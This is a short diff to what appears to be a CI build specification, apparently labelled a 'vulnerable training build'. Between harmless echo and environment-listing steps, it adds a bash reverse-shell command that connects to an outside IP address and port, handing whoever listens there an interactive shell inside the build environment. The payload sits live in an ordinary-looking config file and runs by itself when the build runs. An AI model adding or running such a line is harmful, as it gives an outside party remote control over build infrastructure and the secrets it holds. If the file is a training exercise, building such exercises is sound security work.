@@ -5,4 +5,5 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
+      - bash -i >& /dev/tcp/157.230.104.253/12345 0>&1
       - echo "Done"
